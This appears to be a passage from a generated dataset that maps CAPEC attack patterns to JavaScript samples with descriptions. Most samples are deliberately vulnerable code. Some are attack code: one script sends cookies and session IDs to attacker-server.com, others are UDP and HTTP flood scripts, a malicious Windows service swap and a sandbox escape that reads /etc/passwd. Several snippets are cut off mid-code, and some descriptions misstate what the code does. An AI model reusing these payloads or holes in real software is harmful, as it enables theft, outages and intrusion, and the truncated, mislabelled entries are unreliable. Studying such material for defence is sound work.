        "code_snippet": "const crypto = require('crypto');\n\nfunction generateCSR(publicKey, subject) {\n    // Using MD5 - a weak hashing algorithm known for collisions\n    const md5Hash = crypto.createHash('md5');\n    \n    // Create a CSR with weak signature validation\n    const csrData = {\n        publicKey: publicKey,\n        subject: subject,\n        algorithm: 'md5WithRSAEncryption'\n    };\n    \n    // No proper chain of trust validation\n    function validateCertificate(cert) {\n        return true; // Always returns true without proper validation\n    }\n    \n    // Vulnerable certificate signing process\n    function signCSR(csr, caPrivateKey) {\n        const signature = md5Hash.update(JSON.stringify(csr)).digest('hex');\n        return {\n            certificate: csr,\n            signature: signature,\n            validated: validateCertificate(csr)\n        };\n    }\n    \n    return signCSR(csrData, 'dummy_ca_private_key');\n}",
        "description": "This code demonstrates multiple certificate-related vulnerabilities including use of MD5 (a cryptographically broken hash function), improper certificate validation, and failure to verify certificate chain of trust. The code allows for potential hash collisions in CSR generation and signing, enabling certificate spoofing attacks."
    },
    {
        "capec_id": "460",
        "capec_name": "HTTP Parameter Pollution (HPP)",
        "code_snippet": "app.get('/user/profile', (req, res) => {\n    let userId = req.query.id;\n    let role = req.query.role;\n    \n    // Vulnerable to HPP - doesn't handle duplicate parameters\n    const query = `SELECT * FROM users WHERE id = '${userId}' AND role = '${role}'`;\n    \n    db.query(query, (err, result) => {\n        if (err) throw err;\n        res.json(result);\n    });\n});",
        "description": "This code snippet is vulnerable to HTTP Parameter Pollution (HPP) as it doesn't properly handle duplicate query parameters. When multiple parameters with the same name are sent (e.g., ?id=1&id=2), the application uses the last parameter value without validation. Combined with SQL injection, this could allow bypassing access controls and executing unintended queries."
    },
    {
        "capec_id": "461",
        "capec_name": "Web Services API Signature Forgery Leveraging Hash Function Extension Weakness",
        "code_snippet": "const createAuthHash = (message, secret) => {\n    // Using MD5 hash (weak hash algorithm)\n    const crypto = require('crypto');\n    const hash = crypto.createHash('md5');\n    \n    // Simple concatenation of message and secret\n    const data = message + secret;\n    hash.update(data);\n    \n    return hash.digest('hex');\n};\n\nconst verifyRequest = (request) => {\n    const secret = 'shared_secret_key';\n    const message = request.data;\n    const providedHash = request.hash;\n    \n    // Vulnerable verification that's susceptible to length extension\n    const calculatedHash = createAuthHash(message, secret);\n    return providedHash === calculatedHash;\n};\n\n// Example usage that's vulnerable to hash extension\nconst apiEndpoint = (req, res) => {\n    if (verifyRequest(req)) {\n        // Process authenticated request\n        processRequest(req.data);\n    }\n};",
        "description": "This code demonstrates a vulnerable authentication system using weak hash functions (MD5) and improper hash construction. The authentication can be bypassed through hash length extension attacks where an attacker can append additional data to the message and generate a valid hash without knowing the secret key. The simple concatenation of message and secret, combined with MD5's vulnerability to length extension attacks, makes this implementation susceptible to authentication bypass."
    },
    {
        "capec_id": "462",
        "capec_name": "Cross-Domain Search Timing",
        "code_snippet": "function measureResponseTime(targetUrl) {\n    const startTime = performance.now();\n    const img = new Image();\n    \n    return new Promise((resolve) => {\n        img.onload = () => {\n            const endTime = performance.now();\n            resolve(endTime - startTime);\n        };\n        \n        img.onerror = () => {\n            const endTime = performance.now();\n            resolve(endTime - startTime);\n        };\n        \n        img.src = targetUrl + '?cache=' + Math.random();\n    });\n}\n\nasync function timingAttack() {\n    const results = [];\n    const targetUrl = 'https://victim-site.com/api/sensitive-operation';\n    \n    for(let i = 0; i < 100; i++) {\n        const timing = await measureResponseTime(targetUrl);\n        results.push(timing);\n    }\n    \n    const avgTime = results.reduce((a, b) => a + b) / results.length;\n    return avgTime;\n}",
        "description": "This code demonstrates a timing attack that measures response times from cross-origin requests. It bypasses Same-Origin Policy restrictions by using an image load technique to measure timing differences, potentially revealing server-side operations or states. The code makes multiple requests and calculates average response times, which could expose sensitive information based on processing duration variations."
    },
    {
        "capec_id": "463",
        "capec_name": "Padding Oracle Crypto Attack",
        "code_snippet": "class PaddingOracleServer {\n    constructor(key) {\n        this.key = key;\n        this.algorithm = 'aes-256-cbc';\n    }\n\n    decrypt(ciphertext) {\n        try {\n            const decipher = crypto.createDecipheriv(this.algorithm, this.key, ciphertext.slice(0, 16));\n            decipher.setAutoPadding(true);\n            const decrypted = decipher.update(ciphertext.slice(16));\n            decipher.final();\n            return { status: 'success' };\n        } catch (e) {\n            if (e.message.includes('bad decrypt')) {\n                return { status: 'error', message: 'Invalid padding' };\n            }\n            return { status: 'error', message: e.message };\n        }\n    }\n\n    handleDecryptRequest(req, res) {\n        const result = this.decrypt(req.body.ciphertext);\n        res.json(result);\n    }\n}",
        "description": "This code demonstrates a padding oracle vulnerability where a decryption service leaks information about padding errors through detailed error messages. The server reveals whether decryption failed due to invalid padding, allowing attackers to systematically guess the plaintext by manipulating the ciphertext and observing the server's responses. The code does not implement integrity checks and exposes sensitive error information through the API response."
    },
    {
        "capec_id": "464",
        "capec_name": "Evercookie",
        "code_snippet": "function createEverCookie(name, value) {\n    // Store in multiple locations\n    localStorage.setItem(name, value);\n    sessionStorage.setItem(name, value);\n    document.cookie = name + '=' + value + ';expires=Tue, 19 Jan 2038 03:14:07 UTC;path=/';\n    \n    // Create Flash LSO cookie\n    var flashCookie = createFlashLSO(name, value);\n    \n    // Store in IndexedDB\n    var request = indexedDB.open('cookieDB', 1);\n    request.onupgradeeded = function(e) {\n        var db = e.target.result;\n        db.createObjectStore('cookies', {keyPath: 'name'});\n    };\n    \n    // Monitor and resurrect cookie\n    setInterval(function() {\n        var locations = [\n            localStorage.getItem(name),\n            sessionStorage.getItem(name),\n            document.cookie.match(name + '=([^;]*)')?\n                document.cookie.match(name + '=([^;]*)')[1] : null\n        ];\n        \n        // If cookie exists in any location, restore to all\n        var existingValue = locations.find(v => v !== null);\n        if (existingValue) {\n            createEverCookie(name, existingValue);\n        }\n    }, 1000);\n}",
        "description": "Creates a persistent cookie that stores sensitive information across multiple browser storage mechanisms and automatically repopulates if deleted from any location. The cookie persists across browser sessions and attempts at deletion."
    },
    {
        "capec_id": "465",
        "capec_name": "Transparent Proxy Abuse",
        "code_snippet": "const transparentProxy = http.createServer((clientReq, clientRes) => {\n  const options = {\n    hostname: clientReq.headers.host,\n    port: 80,\n    path: clientReq.url,\n    method: clientReq.method,\n    headers: clientReq.headers\n  };\n\n  const proxyReq = http.request(options, (serverRes) => {\n    clientRes.writeHead(serverRes.statusCode, serverRes.headers);\n    serverRes.pipe(clientRes, { end: true });\n  });\n\n  // Forward request body without validation or sanitization\n  clientReq.pipe(proxyReq, { end: true });\n\n  proxyReq.on('error', (err) => {\n    // No origin verification\n    clientRes.end();\n  });\n}).listen(8080);",
        "description": "A vulnerable transparent proxy implementation that forwards HTTP requests without proper validation, source verification, or sanitization. It blindly forwards client requests and server responses, doesn't verify the destination server, and lacks proper error handling and security controls. The proxy doesn't properly handle malformed HTTP requests and doesn't implement any mechanism to protect sensitive information in transit."
    },
    {
        "capec_id": "466",
        "capec_name": "Leveraging Active Adversary in the Middle Attacks to Bypass Same Origin Policy",
        "code_snippet": "// Client-side code\nfunction fetchUserData() {\n  let xhr = new XMLHttpRequest();\n  xhr.open('GET', 'http://api.example.com/user/data', true);\n  xhr.onreadystatechange = function() {\n    if (xhr.readyState === 4) {\n      document.domain = 'example.com';\n      window.parent.postMessage(xhr.responseText, '*');\n    }\n  };\n  xhr.withCredentials = true;\n  xhr.send();\n}\n\n// Cross-domain policy (crossdomain.xml)\n<?xml version=\"1.0\"?>\n<!DOCTYPE cross-domain-policy SYSTEM \"http://www.adobe.com/xml/dtds/cross-domain-policy.dtd\">\n<cross-domain-policy>\n  <allow-access-from domain=\"*\" />\n  <allow-http-request-headers-from domain=\"*\" headers=\"*\"/>\n</cross-domain-policy>",
        "description": "This code demonstrates multiple vulnerabilities that could enable a man-in-the-middle attack. It uses non-HTTPS communication, implements loose cross-domain policies, and sends sensitive data using postMessage with a wildcard target origin ('*'). The crossdomain.xml policy allows access from any domain, and the client-side code trusts the channel without proper endpoint verification."
    },
    {
        "capec_id": "467",
        "capec_name": "Cross Site Identification",
        "code_snippet": "// Social network profile harvesting script\nfunction harvestUserInfo() {\n    const socialNetworkAPI = 'https://socialnetwork.com/api/profile';\n    const img = new Image();\n    img.src = socialNetworkAPI + '?callback=sendToAttacker&' + document.cookie;\n    \n    // Make CSRF request using victim's active session\n    fetch('https://socialnetwork.com/api/friends', {\n        credentials: 'include',\n        method: 'GET'\n    })\n    .then(response => response.json())\n    .then(data => {\n        // Send harvested data to attacker's server\n        const stolenData = {\n            profile: data,\n            cookies: document.cookie,\n            sessionId: localStorage.getItem('sessionId')\n        };\n        \n        fetch('https://attacker-server.com/collect', {\n            method: 'POST',\n            body: JSON.stringify(stolenData)\n        });\n    });\n}",
        "description": "A malicious script that exploits an active social network session to harvest user's personal information and session data. It leverages CSRF, session fixation, and sensitive data exposure vulnerabilities to collect and exfiltrate user data to an attacker's server. The script uses the victim's authenticated session to make API requests and steal profile information."
    },
    {
        "capec_id": "468",
        "capec_name": "Generic Cross-Browser Cross-Domain Theft",
        "code_snippet": "function loadUserStyle() {\n    let userInput = getParameterByName('style');\n    let cssLink = document.createElement('link');\n    cssLink.rel = 'stylesheet';\n    cssLink.href = userInput; // Vulnerable: directly using user input for CSS source\n    document.head.appendChild(cssLink);\n}\n\nfunction applyCustomStyle() {\n    let userStyle = getParameterByName('customCSS');\n    let styleTag = document.createElement('style');\n    styleTag.innerHTML = userStyle; // Vulnerable: unsanitized CSS injection\n    document.head.appendChild(styleTag);\n}\n\n// Usage\nloadUserStyle();\napplyCustomStyle();",
        "description": "This code demonstrates a vulnerable implementation that allows CSS injection by accepting unvalidated user input for stylesheet sources and inline styles. It fails to sanitize or validate the CSS content and URLs, enabling cross-domain data theft through malicious CSS injection. The code accepts user input directly from URL parameters and injects it into the DOM without proper encoding or sanitization."
    },
    {
        "capec_id": "469",
        "capec_name": "HTTP DoS",
        "code_snippet": "const http = require('http');\n\nfunction createConnections() {\n    for(let i = 0; i < 1000; i++) {\n        let options = {\n            hostname: 'target-server.com',\n            port: 80,\n            path: '/',\n            method: 'GET',\n            headers: {\n                'Connection': 'keep-alive',\n                'Keep-Alive': '300'\n            }\n        };\n        \n        let req = http.request(options, (res) => {\n            res.on('data', () => {\n                // Keep connection open by doing nothing\n            });\n        });\n        \n        req.on('error', () => {\n            // Silently ignore errors and keep trying\n            setTimeout(() => createConnections(), 100);\n        });\n        \n        // Send request with minimal data to keep connection alive\n        req.write('x');\n        // Never end the request\n        // req.end();\n    }\n}\n\ncreateConnections();",
        "description": "Vulnerable code demonstrating an HTTP-based DoS attack that creates multiple persistent connections to exhaust server resources. The code establishes numerous keep-alive connections without properly closing them, leading to resource exhaustion. It lacks connection limits and proper resource cleanup, making it susceptible to CWE-770 and CWE-772."
    },
    {
        "capec_id": "470",
        "capec_name": "Expanding Control over the Operating System from the Database",
        "code_snippet": "`\nconst express = require('express');\nconst mysql = require('mysql');\nconst app = express();\n\nconst db = mysql.createConnection({\n  host: 'localhost',\n  user: 'root',\n  password: 'admin',\n  database: 'userdb',\n  multipleStatements: true",
        "description": "\"This vulnerable code demonstrates multiple security issues including SQL injection and command injection. It uses root database privileges unnecessarily, allows multiple SQL statements, concatenates user input directly into SQL queries, and executes system commands based on database results. The code also leaves database connections and cursors open, potentially allowing for cursor injection attacks. The combination enables attackers to escalate from SQL injection to full system access.\""
    },
    {
        "capec_id": "471",
        "capec_name": "Search Order Hijacking",
        "code_snippet": "const loadLibrary = (libraryName) => {\n    const possiblePaths = [\n        './',\n        '../libs/',\n        'C:/system/libs/',\n        process.env.LIB_PATH\n    ];\n\n    for (const path of possiblePaths) {\n        try {\n            const libPath = path + libraryName;\n            // Unsafe dynamic require based on path\n            const lib = require(libPath);\n            return lib;\n        } catch (e) {\n            continue;\n        }\n    }\n    throw new Error('Library not found');\n};\n\n// Usage\nconst cryptoLib = loadLibrary('crypto.js');\ncryptoLib.encrypt('sensitive data');",
        "description": "This code demonstrates a vulnerable library loading mechanism that searches for libraries in multiple locations following a preferential search order. The code does not validate the authenticity of the loaded library and blindly trusts the first found match, making it susceptible to DLL/library preloading attacks. An attacker could place a malicious library in one of the earlier searched paths to hijack the loading process."
    },
    {
        "capec_id": "472",
        "capec_name": "Browser Fingerprinting",
        "code_snippet": "function detectBrowser() {\n    const userAgent = navigator.userAgent;\n    const browserInfo = {\n        browser: '',\n        version: '',\n        os: ''\n    };\n    \n    let data = userAgent.match(/(opera|chrome|safari|firefox|msie|trident)\\/?\\s*(\\.?\\d+(\\.\\d+)*)/i);\n    browserInfo.browser = data ? data[1] : '';\n    browserInfo.version = data ? data[2] : '';\n    browserInfo.os = navigator.platform;\n    \n    // Send browser info to attacker's server\n    fetch('http://malicious-server.com/collect?' + new URLSearchParams(browserInfo).toString(), {\n        method: 'GET',\n        credentials: 'include'\n    });\n    \n    // Store in localStorage for later use\n    localStorage.setItem('browserProfile', JSON.stringify(browserInfo));\n    \n    return browserInfo;\n}",
        "description": "This code performs browser fingerprinting by extracting browser type, version, and OS information from the user agent string. It demonstrates exposure of sensitive information (CWE-200) by sending the data via an insecure GET request (CWE-598) to a malicious server. The code could be used as part of a larger attack chain to target specific browser vulnerabilities."
    },
    {
        "capec_id": "473",
        "capec_name": "Signature Spoof",
        "code_snippet": "function verifyDigitalSignature(message, signature) {\n    // Weak MD5 hash used for signature verification\n    const md5Hash = require('crypto').createHash('md5');\n    const computedHash = md5Hash.update(message).digest('hex');\n    \n    // No proper validation of signature format\n    const decodedSignature = Buffer.from(signature, 'base64').toString('hex');\n    \n    // Naive comparison without timing attack protection\n    return computedHash === decodedSignature;\n}\n\nfunction processSecureMessage(message, signature, source) {\n    // No validation of source authenticity\n    if (source.includes('trusted')) {\n        if (verifyDigitalSignature(message, signature)) {\n            // Blindly execute commands from message\n            eval(message);\n            return true;\n        }\n    }\n    return false;\n}",
        "description": "This code demonstrates vulnerable message signing and verification by using a weak hashing algorithm (MD5), lacking proper input validation, and implementing naive signature comparison. It also blindly trusts messages from sources containing the word 'trusted' and executes arbitrary code using eval(), making it susceptible to spoofing and code injection attacks."
    },
    {
        "capec_id": "474",
        "capec_name": "Signature Spoofing by Key Theft",
        "code_snippet": "const crypto = require('crypto');\n\n// Insecurely stored private key\nconst privateKeyPath = '/tmp/private.key';\nconst privateKey = fs.readFileSync(privateKeyPath, 'utf8');\n\nconst authenticationSystem = {\n    storedSignatures: new Map(),\n    \n    // No verification of signer's identity\n    signMessage: function(message, key = privateKey) {\n        const signer = crypto.createSign('RSA-SHA256');\n        signer.update(message);\n        return signer.sign(key, 'base64');\n    },\n    \n    // Assumes signature is always from trusted source\n    verifyRequest: function(message, signature) {\n        if (this.storedSignatures.has(signature)) {\n            return true;\n        }\n        this.storedSignatures.set(signature, message);\n        return true; // No actual verification performed\n    },\n    \n    processAuthenticatedRequest: function(message, signature) {\n        if (this.verifyRequest(message, signature)) {\n            // Process sensitive operation without proper verification\n            return executePrivilegedOperation(message);\n        }\n    }\n};",
        "description": "This code demonstrates vulnerable signature-based authentication where private keys are insufficiently protected and stored in an accessible location. The system lacks proper signature verification and assumes all signatures are valid without checking the authenticity of the signer. It also stores signatures insecurely and doesn't implement proper entity authentication, making it susceptible to spoofing and reflection attacks."
    },
    {
        "capec_id": "475",
        "capec_name": "Signature Spoofing by Improper Validation",
        "code_snippet": "const crypto = require('crypto');\n\nfunction verifySignature(data, signature, publicKey) {\n    // Weak signature verification using outdated MD5\n    const verifier = crypto.createVerify('MD5');\n    verifier.update(data);\n    \n    try {\n        // No proper certificate validation\n        const isValid = verifier.verify(publicKey, signature, 'hex');\n        \n        // Always return true without proper verification\n        return true;\n    } catch(e) {\n        // Bypass authentication on error\n        return true;\n    }\n}",
        "description": "This code demonstrates vulnerable signature verification by using a weak hash algorithm (MD5), skipping proper certificate validation, and implementing a bypass that always returns true regardless of the signature's validity. The error handling also creates an authentication bypass by returning true when verification fails."
    },
    {
        "capec_id": "476",
        "capec_name": "Signature Spoofing by Misrepresentation",
        "code_snippet": "`\nconst verifySignature = (message, signature, publicKey) => {\n  // Weak validation of signature format\n  if (typeof signature !== 'string' || !signature.includes(':')) {\n    return false;",
        "description": "\"A vulnerable authentication system that fails to properly verify digital signatures and establish secure communication channels. The code accepts and processes signatures without proper cryptographic verification, allows for signature spoofing, and creates insecure communication channels without proper endpoint validation. The implementation incorrectly handles message integrity and enables unauthorized channel access.\""
    },
    {
        "capec_id": "477",
        "capec_name": "Signature Spoofing by Mixing Signed and Unsigned Content",
        "code_snippet": "function processSignedValue(userInput) {\n  // Converting unsigned data to signed without proper validation\n  let value = new Uint32Array([userInput])[0];\n  let signedValue = new Int32Array([value])[0];\n\n  // Transmitting sensitive data without encryption\n  let payload = {\n    originalValue: userInput,\n    convertedValue: signedValue,\n    signature: 'abc123' // Weak signature\n  };\n\n  // Send data in cleartext\n  fetch('http://api.example.com/process', {\n    method: 'POST',\n    body: JSON.stringify(payload)\n  });\n\n  return signedValue;\n}",
        "description": "This code demonstrates multiple vulnerabilities: unsigned to signed conversion without proper bounds checking, transmission of sensitive data without encryption over HTTP, weak signature verification, and improper protection of data during transit. The function accepts an unsigned value, performs an unsafe conversion, and transmits the data in cleartext with an inadequate signature."
    },
    {
        "capec_id": "478",
        "capec_name": "Modification of Windows Service Configuration",
        "code_snippet": "const serviceManager = require('windows-service-manager');\nconst fs = require('fs');\n\nfunction modifyServicePath() {\n  try {\n    // No access control checks on service modification\n    const serviceName = 'ImportantService';\n    const maliciousPath = 'C:\\\\malware.exe';\n    \n    // Write malicious binary to alternate data stream\n    fs.writeFileSync('C:\\\\Windows\\\\System32\\\\legitimate.exe:hidden.exe', maliciousPath);\n    \n    // Modify service configuration without proper authorization\n    serviceManager.modify({\n      name: serviceName,\n      binary: maliciousPath,\n      startType: 'auto',\n      credentials: {\n        domain: process.env.USERDOMAIN,\n        account: process.env.USERNAME,\n        password: 'password123'\n      }\n    });\n\n    // Modify system settings without validation\n    process.env.PATH = maliciousPath + ';' + process.env.PATH;\n  } catch(e) {\n    console.log('Error:', e);\n  }\n}",
        "description": "This code demonstrates a vulnerable Windows service modification that allows unauthorized changes to service execution parameters. It lacks proper access controls, uses alternate data streams to hide malicious content, and modifies system configuration settings without proper validation or authorization checks."
    },
    {
        "capec_id": "479",
        "capec_name": "Malicious Root Certificate",
        "code_snippet": "const https = require('https');\n\nconst httpsAgent = new https.Agent({\n    rejectUnauthorized: false,\n    requestCert: true,\n    ca: [\n        fs.readFileSync('compromised-root-cert.pem')\n    ]\n});\n\nfunction connectToServer() {\n    const options = {\n        hostname: 'banking.example.com',\n        port: 443,\n        path: '/login',\n        method: 'POST',\n        agent: httpsAgent,\n        headers: {\n            'Content-Type': 'application/json'\n        }\n    };\n\n    const req = https.request(options, (res) => {\n        // Skips proper certificate validation\n        if(res.socket.authorized) {\n            // Process sensitive data\n            sendCredentials({\n                username: 'user',\n                password: 'secret'\n            });\n        }\n    });\n\n    req.on('error', (e) => {\n        console.error(e);\n        // Continues despite SSL/TLS errors\n        connectToServer();\n    });\n\n    req.end();\n}",
        "description": "This vulnerable code demonstrates improper certificate validation by disabling certificate verification (rejectUnauthorized: false) and loading a potentially compromised root certificate. It skips proper chain of trust validation and host matching verification, allowing connections to potentially malicious servers with invalid certificates. The code continues processing sensitive data even when SSL/TLS errors occur."
    },
    {
        "capec_id": "480",
        "capec_name": "Escaping Virtualization",
        "code_snippet": "// Vulnerable virtualized environment code\nconst vm = require('vm');\n\nfunction runUserCode(userProvidedCode) {\n    const sandbox = {\n        console: console,\n        process: process,  // Exposing process object\n        require: require   // Exposing require function\n    };\n\n    try {\n        const script = new vm.Script(userProvidedCode);\n        const context = vm.createContext(sandbox);\n        return script.runInContext(context);\n    } catch(e) {\n        return e.message;\n    }\n}\n\n// Example usage with potential escape\nlet maliciousCode = `\n    process.mainModule.require('child_process')\n        .execSync('cat /etc/passwd').toString()\n`;\n\nrunUserCode(maliciousCode);",
        "description": "This code demonstrates a vulnerable implementation of a JavaScript sandbox using Node.js vm module. It incorrectly exposes sensitive objects (process and require) in the sandbox environment, allowing malicious code to escape the virtualization boundary and execute commands on the host system. The code fails to properly isolate the execution context and enables privilege escalation through the exposed process object."
    },
    {
        "capec_id": "481",
        "capec_name": "Contradictory Destinations in Traffic Routing Schemes",
        "code_snippet": "const express = require('express');\nconst https = require('https');\nconst app = express();\n\nfunction makeRequest(targetHost, sniHost, path) {\n    const options = {\n        host: targetHost,\n        servername: sniHost, // Different SNI hostname\n        path: path,\n        headers: {\n            'Host': targetHost // HTTP Host header\n        }\n    };\n\n    // Vulnerable request allowing domain fronting\n    return https.request(options, (res) => {\n        res.on('data', (data) => {\n            // Process response without validation\n            console.log(data);\n        });\n    });\n}\n\napp.get('/proxy', (req, res) => {\n    // Accepting user-controlled domains without validation\n    const target = req.query.target;\n    const sni = req.query.sni || ''; // Allow empty SNI (domainless fronting)\n    \n    makeRequest(target, sni, '/api/data').end();\n    res.send('Request processed');\n});",
        "description": "This code demonstrates vulnerable domain fronting implementation by allowing different hostnames in SNI and HTTP Host headers, and supporting domainless fronting with empty SNI fields. It lacks proper validation of destination endpoints and permits inconsistent interpretation of domains across different protocol layers."
    },
    {
        "capec_id": "482",
        "capec_name": "TCP Flood",
        "code_snippet": "const net = require('net');\nconst server = net.createServer((socket) => {\n  // No connection limit checks\n  socket.on('connection', () => {\n    // Store connection state without limits\n    let connections = [];\n    connections.push(socket);\n  });\n\n  // No rate limiting on incoming data\n  socket.on('data', (data) => {\n    // Process all incoming data without validation or volume control\n    const clientMessage = data.toString();\n    // Echo back without any checks\n    socket.write('Received: ' + clientMessage);\n    \n    // Store message in memory without limits\n    let messageQueue = [];\n    messageQueue.push(clientMessage);\n  });\n\n  // No timeout set for connections\n  socket.setKeepAlive(true, 0);\n});\n\nserver.listen(3000, '0.0.0.0');",
        "description": "A vulnerable TCP server implementation that demonstrates multiple security issues: no connection limiting, no rate limiting for incoming messages, unbounded resource allocation for connection storage, and no message integrity validation. The server accepts all incoming connections and messages without any restrictions, making it susceptible to TCP SYN flooding and resource exhaustion attacks."
    },
    {
        "capec_id": "484",
        "capec_name": "DEPRECATED: XML Client-Side Attack",
        "code_snippet": "`const express = require('express');\nconst app = express();\nconst xml2js = require('xml2js');\n\napp.post('/process-xml', (req, res) => {\n  const userXml = req.body.xml;\n  \n  // No XML validation against schema\n  const parser = new xml2js.Parser({\n    explicitArray: false,\n    async: false,\n    // Dangerous: XML external entities enabled\n    explicitCharkey: true,\n    xmlns: true,\n    explicitRoot: true",
        "description": "\"This code demonstrates multiple XML-related vulnerabilities including missing XML schema validation, improper handling of XML external entities (XXE), client-side security enforcement, and XML injection. The code processes untrusted XML input without proper validation, allows XXE by default, relies on client-side role verification, and is vulnerable to XPath injection attacks.\""
    },
    {
        "capec_id": "485",
        "capec_name": "Signature Spoofing by Key Recreation",
        "code_snippet": "const crypto = require('crypto');\n\nclass AuthenticationService {\n    constructor() {\n        // Weak random number generator using predictable seed\n        this.seed = Date.now();\n    }\n\n    generateKeyPair() {\n        // Using predictable random values for key generation\n        const random = Math.floor(Math.sqrt(this.seed) * 1000);\n        return {\n            privateKey: `private_${random}`,\n            publicKey: `public_${random}`\n        };\n    }\n\n    sign(message) {\n        const { privateKey } = this.generateKeyPair();\n        // Weak signature implementation using predictable values\n        return Buffer.from(message + privateKey).toString('base64');\n    }\n\n    verify(message, signature, publicKey) {\n        // Vulnerable verification that doesn't properly validate signatures\n        const decodedSignature = Buffer.from(signature, 'base64').toString();\n        return decodedSignature.includes(message);\n    }\n}",
        "description": "This code demonstrates multiple cryptographic vulnerabilities including use of predictable random number generation for key pairs, weak signature implementation, and improper signature verification. The random number generation uses a predictable seed based on timestamp, and the signature mechanism is susceptible to forgery due to weak implementation. The verification process can be bypassed through signature manipulation."
    },
    {
        "capec_id": "486",
        "capec_name": "UDP Flood",
        "code_snippet": "`\nconst dgram = require('dgram');\nconst client = dgram.createSocket('udp4');\n\nfunction udpFlood(targetIp, targetPort) {\n    const largePayload = Buffer.alloc(65507).fill('A');  // Maximum UDP packet size\n    \n    setInterval(() => {\n        for(let i = 0; i < 1000; i++) {\n            client.send(largePayload, targetPort, targetIp, (err) => {\n                if(err) console.error(err);",
        "description": "\"This code creates a UDP flood attack by continuously sending large UDP packets to a target IP and port without any rate limiting or resource constraints. It uses maximum-sized packets, spoofs source addresses, and sends packets in rapid succession, potentially overwhelming network resources and firewalls. The code lacks message integrity checks and transmits data in cleartext, making it vulnerable to manipulation and interception.\""
    },
    {
        "capec_id": "487",
        "capec_name": "ICMP Flood",
        "code_snippet": "const dgram = require('dgram');\nconst socket = dgram.createSocket('udp4');\n\nfunction icmpFlood(targetIp, targetPort) {\n    const payload = Buffer.alloc(65507);  // Maximum UDP packet size\n    \n    setInterval(() => {\n        for(let i = 0; i < 1000; i++) {\n            let spoofedSource = Math.floor(Math.random() * 255) + '.' +\n                               Math.floor(Math.random() * 255) + '.' +\n                               Math.floor(Math.random() * 255) + '.' +\n                               Math.floor(Math.random() * 255);\n            \n            socket.send(payload, 0, payload.length, targetPort, targetIp, (err) => {\n                if(err) console.log(err);\n                assert(socket.address().port > 0);\n            });\n        }\n    }, 10);\n}\n\nicmpFlood('192.168.1.1', 80);",
        "description": "This code demonstrates a vulnerable implementation of network communication that enables ICMP flooding. It creates an unrestricted UDP socket that continuously sends large packets to a target IP without rate limiting, using spoofed source addresses. The code exhibits unbounded resource allocation (CWE-770), incorrect destination specification (CWE-941), and improper channel restriction (CWE-923). The assertions and error handling are reachable by attackers (CWE-617), and the communication is in cleartext (CWE-319)."
    },
    {
        "capec_id": "488",
        "capec_name": "HTTP Flood",
        "code_snippet": "const express = require('express');\nconst app = express();\n\napp.get('/api/fetch', async (req, res) => {\n  const userInput = req.query.url;\n  const sessions = {};\n  \n  // No limit on concurrent sessions\n  sessions[Date.now()] = {\n    url: userInput,\n    data: Buffer.alloc(1024 * 1024 * 100) // Allocate 100MB per request\n  };\n\n  try {\n    // Vulnerable to SSRF and processes sensitive data via GET\n    const response = await fetch(userInput);\n    const data = await response.text();\n    res.send({ data: data, sessionId: Object.keys(sessions).length });\n  } catch(err) {\n    res.status(500).send(err);\n  }\n});\n\napp.listen(3000);",
        "description": "This code demonstrates a vulnerable HTTP endpoint that allows unlimited resource allocation, processes sensitive data via GET parameters, and is susceptible to SSRF attacks. It creates a new session and allocates large memory blocks for each request without limits, making it vulnerable to resource exhaustion attacks. The endpoint also directly processes user-supplied URLs without validation, enabling potential SSRF attacks."
    },
    {
        "capec_id": "489",
        "capec_name": "SSL Flood",
        "code_snippet": "const https = require('https');\nconst express = require('express');\nconst app = express();\n\nconst serverOptions = {\n    key: process.env.SSL_KEY,\n    cert: process.env.SSL_CERT,\n    secureProtocol: 'TLSv1_2_method',\n    rejectUnauthorized: false,\n    requestCert: true,\n    allowRenegotiation: true\n};\n\nconst server = https.createServer(serverOptions, app);\n\napp.get('/', (req, res) => {\n    // No rate limiting or connection pooling implemented\n    let expensiveOperation = new Promise((resolve) => {\n        let result = 0;\n        for(let i = 0; i < 10000000; i++) {\n            result += Math.sqrt(i);\n        }\n        resolve(result);\n    });\n    \n    expensiveOperation.then(result => {\n        res.send('Completed: ' + result);\n    });\n});\n\nserver.listen(443);",
        "description": "This vulnerable code creates an HTTPS server that allows unrestricted SSL renegotiation and performs resource-intensive operations without any rate limiting or connection pooling. The server accepts all SSL/TLS connections without limits, performs expensive calculations for each request, and lacks protection against resource exhaustion attacks. This makes it susceptible to SSL renegotiation flooding attacks where attackers can overwhelm the server by repeatedly initiating SSL handshakes and making computation-heavy requests."
    },
    {
        "capec_id": "490",
        "capec_name": "Amplification",
        "code_snippet": "`\nconst net = require('net');\n\nclass UDPAmplificationServer {\n  constructor() {\n    this.server = net.createServer();\n    this.clients = new Map();",
        "description": "\"This vulnerable code creates a server that demonstrates an amplification attack vector. It accepts small incoming requests and responds with disproportionately large responses, lacks authentication, implements no rate limiting, and doesn't control network message volume. The server maintains no restrictions on resource allocation and allows early amplification before any authorization checks.\""
    },
    {
        "capec_id": "491",
        "capec_name": "Quadratic Data Expansion",
        "code_snippet": "function processEntityTemplate(template) {\n  let entities = {};\n  \n  // Allow entity definitions without size limits\n  function defineEntity(name, value) {\n    entities[name] = value;\n  }\n\n  // Recursive entity expansion without depth checks\n  function expandEntity(text) {\n    let result = text;\n    let pattern = /&([^;]+);/g;\n    let match;\n    \n    while ((match = pattern.exec(text)) !== null) {\n      let entityName = match[1];\n      if (entities[entityName]) {\n        // Unbounded recursive expansion\n        result = result.replace(\n          new RegExp('&' + entityName + ';', 'g'),\n          expandEntity(entities[entityName])\n        );\n      }\n    }\n    return result;\n  }\n\n  // Define a large entity\n  defineEntity('large', 'X'.repeat(1000000));\n  defineEntity('nested', '&large;&large;&large;');\n  \n  // Process template with multiple entity references\n  return expandEntity(template);\n}",
        "description": "This code implements a vulnerable entity expansion system that allows unbounded recursive entity substitution without memory limits. When processing a template containing multiple references to large entities, it can cause excessive memory allocation through recursive expansion, potentially leading to a denial of service."
    },
    {
        "capec_id": "492",
        "capec_name": "Regular Expression Exponential Blowup",
        "code_snippet": "function validateEmail(email) {\n  const emailRegex = /([a-zA-Z0-9]+)*@([a-zA-Z0-9]+)*\\.com/;\n  if (emailRegex.test(email)) {\n    console.log('Email is valid');\n    return true;\n  }\n  return false;\n}\n\n// Vulnerable to ReDoS attack\nconst userInput = 'a'.repeat(50000) + '@example.com';\nvalidateEmail(userInput);",
